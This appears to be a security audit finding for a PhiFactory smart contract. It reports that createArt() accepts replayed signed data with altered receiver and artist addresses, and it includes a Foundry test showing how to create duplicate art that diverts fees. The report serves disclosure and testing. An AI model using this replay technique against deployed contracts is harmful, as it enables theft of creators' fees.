# Vulnerability details

## Impact
Create duplicate art similar to original one by bypassing createArt() function signature verification to potentially steal receiver fee.

## Proof of Concept
createArt() function allow user to create art if they have a valid phiSignerAddress signed data but this function allow create duplicate art with same signed data and user can also change some data in this art as well specifically `receiver` and `artist` address. So malicious can create a malicious/duplicate art from a genuine / important art with malicious user address as `receiver` and `artist` address so that when other user will claim art reward they might mistakenly use malicious user art and now the malicious can claim the receiver reward from the contract.

Foundry test case to proof that it's possible to create duplicate art using changed `receiver` and `artist` address from a valid phiSignerAddress signed data.

Save the test code in PhiFactory.t.sol file and run `forge test --mt test_duplicate_createArt -vvv`:
```
function test_duplicate_createArt() external {
        string memory artIdUrl_ = "sample-art-id";
        bytes memory credData = abi.encode(1, owner, "SIGNATURE", 31_337, bytes32(0));
        bytes memory signCreateData = abi.encode(expiresIn, artIdUrl_, credData);
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
        IPhiFactory.CreateConfig memory config =
            IPhiFactory.CreateConfig(artCreator, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);

        address caller = makeAddr("caller");
        vm.deal(caller, 2 ether);
        IPhiFactory.CreateConfig memory config2 =
            IPhiFactory.CreateConfig(caller, caller, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);
        
        console2.log(phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), config));
        console2.log("Original ART:", phiFactory.artIdCounter());

        vm.prank(caller);
        console2.log(phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), config2));
        console2.log("Duplicate ART:", phiFactory.artIdCounter());
    }
```
